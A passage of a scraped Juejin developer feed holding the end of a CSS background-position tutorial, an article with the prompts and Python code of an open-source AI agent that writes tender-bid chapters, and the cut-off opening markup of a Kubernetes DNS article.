            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4218165277233182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:04:07.000Z" title="Fri Dec 05 2025 03:04:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>background-position</strong>是CSS中用于设置背景图片初始位置的属性。这个位置是相对于由<strong>background-origin</strong>定义的位置图层的。通过这个属性，可以精确控制背景图像在元素中的位置，无论是水平还是垂直方向。</p>
<p>使用background-position</p>
<p><strong>background-position</strong>属性可以接受多种类型的值，包括关键字、百分比或长度值。这些值定义了背景图像相对于元素盒子模型边界的x/y坐标。例如：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 关键字值 */</span>
<span class="hljs-attribute">background-position</span>: top;
<span class="hljs-attribute">background-position</span>: bottom;
<span class="hljs-attribute">background-position</span>: left;
<span class="hljs-attribute">background-position</span>: right;
<span class="hljs-attribute">background-position</span>: center;
<span class="hljs-comment">/* 百分比值 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">25%</span> <span class="hljs-number">75%</span>;
<span class="hljs-comment">/* 长度值 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">1cm</span> <span class="hljs-number">2cm</span>;
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">10ch</span> <span class="hljs-number">8em</span>;
<span class="hljs-comment">/* 多个背景图像 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>, center;
<span class="hljs-comment">/* 边缘偏移值 */</span>
<span class="hljs-attribute">background-position</span>: bottom <span class="hljs-number">10px</span> right <span class="hljs-number">20px</span>;
</code></pre>
<p>语法和值</p>
<ul>
<li><strong>单个值</strong>：如果只指定了一个值，第二个值默认是<strong>center</strong>。</li>
<li><strong>两个值</strong>：第一个值通常是水平位置，第二个值是垂直位置。如果两个值都是关键字，比如<em>top left</em>，它们的顺序不重要，因为浏览器会重新排序。</li>
<li><strong>三个值</strong>：两个关键字值和一个偏移量，其中偏移量是前面关键字值的偏移。</li>
<li><strong>四个值</strong>：两个定义X和Y的关键字值，以及两个偏移量。</li>
</ul>
<p>百分比值的计算</p>
<p>百分比值是相对于容器的大小减去背景图像大小的。例如，<em>background-position: 25% 75%</em> 表示图像上的左侧25%和顶部75%的位置将放置在距容器左侧25%和距容器顶部75%的容器位置。</p>
<p>示例</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 使用 `background` 缩写 */</span>
exampleone {
 <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>) <span class="hljs-number">#ffee99</span> <span class="hljs-number">2.5cm</span> bottom no-repeat;
}
exampletwo {
 <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>) <span class="hljs-number">#ffee99</span> left <span class="hljs-number">4em</span> bottom <span class="hljs-number">1em</span> no-repeat;
}
<span class="hljs-comment">/* 多背景图片：每个图片依次和相应的 `background-position` 匹配 */</span>
examplethree {
 <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">"catfront.png"</span>);
 <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0px</span> <span class="hljs-number">0px</span>, right <span class="hljs-number">3em</span> bottom <span class="hljs-number">2em</span>;
}
</code></pre>
<p>在上述示例中， <em>.exampleone</em>和 <em>.exampletwo</em>使用了<em>background</em>缩写来设置背景图像及其位置，而 <em>.examplethree</em>则演示了如何为两个不同的背景图片指定位置。</p>
<p>浏览器兼容性</p>
<p><strong>background-position</strong>属性在所有现代浏览器中都得到了支持，包括Chrome、Firefox、Safari、Opera等。对于旧版本的IE，可能需要额外的兼容性考虑。</p>
<p>通过使用<strong>background-position</strong>属性，开发者可以灵活地控制背景图像的显示方式，无论是固定在某个位置，还是相对于元素的边缘进行偏移。这为页面设计提供了更多的创意空间和视觉效果的可能性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[标书智能体（三）——生成标书正文代码+提示词]]></title>    <link>https://juejin.cn/post/7579892134816727075</link>    <guid>https://juejin.cn/post/7579892134816727075</guid>    <pubDate>2025-12-05T03:05:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892134816727075" data-draft-id="7579887768227627042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="标书智能体（三）——生成标书正文代码+提示词"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-05T03:05:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户246293206767"/> <meta itemprop="url" content="https://juejin.cn/user/3871844943530826"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            标书智能体（三）——生成标书正文代码+提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3871844943530826/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户246293206767
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:05:59.000Z" title="Fri Dec 05 2025 03:05:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>用Python+React打造一个开源的AI写标书智能体~</p>
<p><strong>完整代码已开源</strong></p>
<p>代码很多，文章只放主要代码和提示词，完整代码可以查看开源项目</p>
<p>Github： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyibiaoai%2Fyibiao-simple" target="_blank" title="https://github.com/yibiaoai/yibiao-simple" ref="nofollow noopener noreferrer">github.com/yibiaoai/yi…</a></p>
<p>Gitee： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyibiao-ai%2Fyibiao-simple" target="_blank" title="https://gitee.com/yibiao-ai/yibiao-simple" ref="nofollow noopener noreferrer">gitee.com/yibiao-ai/y…</a></p>
<p>今天是第三期，根据生成好的提纲，填充标书内容。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c029176a80ef4a96af10c4b1c6e7cbd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ2MjkzMjA2NzY3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765508759&amp;x-signature=XKaVIeY7WYL%2BDCDQbm1fGgF5xSY%3D" alt="" loading="lazy"/></p>
<p>正文生成，并不像上一节讲的提纲生成那么复杂，核心难点只有两个：</p>
<ul>
<li><strong>标书需求字数太多：</strong> 一份标书动辄几万几十万字，直接让AI生成必然行不通。有了上一节生成提纲的经验，我们已经知道答案了，那就是把正文也打碎，让AI按照提纲的叶子节点，逐节生成正文。</li>
<li><strong>上下文不连贯，或内容重复：</strong> 这就引出了我们第二个难点，分布生成，多部分内容之间不连贯是肯定的，可以更大的问题是，都是基于一份招标文件生成的技术方案，很可能生成意思过于相近的内容，俗称车轱辘话。
下面，咱们就来逐项分析一下，如何解决上述难点。</li>
</ul>
<h2 data-id="heading-0">一、获取生成内容所需信息</h2>
<p>从前端拆分提纲，提纲的每一个叶子节点都发起一个生成请求，需要传递以下参数</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChapterContentRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""单章节内容生成请求"""</span>
    chapter: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] = Field(..., description=<span class="hljs-string">"章节信息"</span>)
    parent_chapters: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]] = Field(<span class="hljs-literal">None</span>, description=<span class="hljs-string">"上级章节列表"</span>)
    sibling_chapters: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]] = Field(<span class="hljs-literal">None</span>, description=<span class="hljs-string">"同级章节列表"</span>)
    project_overview: <span class="hljs-built_in">str</span> = Field(<span class="hljs-string">""</span>, description=<span class="hljs-string">"项目概述"</span>)
</code></pre>
<ul>
<li><strong>chapter：</strong> 本章节信息，不多说，这是必须的</li>
</ul>

<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.2.2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"技术实力"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"技术研发能力和创新情况"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong>parent_chapters：</strong> 上级章节列表，为了保持连贯性</li>
<li><strong>sibling_chapters：</strong> 同级章节列表，为了生成内容不重复</li>
<li><strong>project_overview：</strong> 项目概述，这是核心，让AI知道自己要写的标书的核心需求</li>
</ul>
<h2 data-id="heading-1">二、核心提示词</h2>
<p><strong>SystemPrompt</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">你是一个专业的标书编写专家，负责为投标文件的技术标部分生成具体内容。

要求：
<span class="hljs-bullet">1.</span> 内容要专业、准确，与章节标题和描述保持一致
<span class="hljs-bullet">2.</span> 这是技术方案，不是宣传报告，注意朴实无华，不要假大空
<span class="hljs-bullet">3.</span> 语言要正式、规范，符合标书写作要求，但不要使用奇怪的连接词，不要让人觉得内容像是AI生成的
<span class="hljs-bullet">4.</span> 内容要详细具体，避免空泛的描述
<span class="hljs-bullet">5.</span> 注意避免与同级章节内容重复，保持内容的独特性和互补性
<span class="hljs-bullet">6.</span> 直接返回章节内容，不生成标题，不要任何额外说明或格式标记
</code></pre>
<p><strong>UserPrompt</strong>
这个就需要拼接一下了</p>
<pre><code class="hljs language-markdown" lang="markdown">项目概述信息：
{project<span class="hljs-emphasis">_overview}

请为以下标书章节生成具体内容：

{context_</span>info if context<span class="hljs-emphasis">_info else ''}

当前章节信息：
章节ID: {chapter_</span>id}
章节标题: {chapter<span class="hljs-emphasis">_title}
章节描述: {chapter_</span>description}

请根据项目概述信息和上述章节层级关系，生成详细的专业内容，确保与上级章节的内容逻辑相承，同时避免与同级章节内容重复，突出本章节的独特性和技术方案的优势。
</code></pre>
<p>context_info是拼接的上级、统计节点信息</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 构建上下文信息</span>
context_info = <span class="hljs-string">""</span>

<span class="hljs-comment"># 上级章节信息</span>
<span class="hljs-keyword">if</span> parent_chapters:
    context_info += <span class="hljs-string">"上级章节信息：\n"</span>
    <span class="hljs-keyword">for</span> parent <span class="hljs-keyword">in</span> parent_chapters:
        context_info += <span class="hljs-string">f"- <span class="hljs-subst">{parent[<span class="hljs-string">'id'</span>]}</span> <span class="hljs-subst">{parent[<span class="hljs-string">'title'</span>]}</span>\n  <span class="hljs-subst">{parent[<span class="hljs-string">'description'</span>]}</span>\n"</span>

<span class="hljs-comment"># 同级章节信息（排除当前章节）</span>
<span class="hljs-keyword">if</span> sibling_chapters:
    context_info += <span class="hljs-string">"同级章节信息（请避免内容重复）：\n"</span>
    <span class="hljs-keyword">for</span> sibling <span class="hljs-keyword">in</span> sibling_chapters:
        <span class="hljs-keyword">if</span> sibling.get(<span class="hljs-string">'id'</span>) != chapter_id:  <span class="hljs-comment"># 排除当前章节</span>
            context_info += <span class="hljs-string">f"- <span class="hljs-subst">{sibling.get(<span class="hljs-string">'id'</span>, <span class="hljs-string">'unknown'</span>)}</span> <span class="hljs-subst">{sibling.get(<span class="hljs-string">'title'</span>, <span class="hljs-string">'未命名'</span>)}</span>\n  <span class="hljs-subst">{sibling.get(<span class="hljs-string">'description'</span>, <span class="hljs-string">''</span>)}</span>\n"</span>

</code></pre>
<p>拼接后的完整user_prompt示例</p>
<blockquote>
<p>请为以下标书章节生成具体内容：
上级章节信息：</p>
<ul>
<li>1 投标文件技术要求响应程度
对项目技术要求的响应和符合情况</li>
<li>1.1 技术规格响应
详细描述投标产品技术参数与招标技术要求的符合性</li>
</ul>
<p>同级章节信息（请避免内容重复）：</p>
<ul>
<li>1.1.2 技术文件完整性
提供的技术文件是否齐全、规范
当前章节信息：
章节ID: 1.1.1
章节标题: 灯具规格符合性
章节描述: 逐项说明各灯具规格与招标文件要求的匹配情况</li>
</ul>
<p>请根据项目概述信息和上述章节层级关系，生成详细的专业内容，确保与上级章节的内容逻辑相承，同时避免与同级章节内容重复，突出本章节的独特性和技术方案的优势。</p>
</blockquote>
<p>就这么简单，生成正文不需要过多的逻辑推理，用最普通的大模型即可实现稳定输出，也几乎不存在生成失败的问题~</p>
<h2 data-id="heading-2">完整代码已开源</h2>
<p>Github： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyibiaoai%2Fyibiao-simple" target="_blank" title="https://github.com/yibiaoai/yibiao-simple" ref="nofollow noopener noreferrer">github.com/yibiaoai/yi…</a></p>
<p>Gitee： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyibiao-ai%2Fyibiao-simple" target="_blank" title="https://gitee.com/yibiao-ai/yibiao-simple" ref="nofollow noopener noreferrer">gitee.com/yibiao-ai/y…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kubernetes 节点 DNS 解析异常问题排查与解决方案]]></title>    <link>https://juejin.cn/post/7579872561675960329</link>    <guid>https://juejin.cn/post/7579872561675960329</guid>    <pubDate>2025-12-05T03:07:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579872561675960329" data-draft-id="7579872561675796489" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kubernetes 节点 DNS 解析异常问题排查与解决方案"/> <meta itemprop="keywords" content="后端,Kubernetes"/> <meta itemprop="datePublished" content="2025-12-05T03:07:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="壹米饭"/> <meta itemprop="url" content="https://juejin.cn/user/4178616274387758"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kubernetes 节点 DNS 解析异常问题排查与解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4178616274387758/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    壹米饭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:07:51.000Z" title="Fri Dec 05 2025 03:07:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body 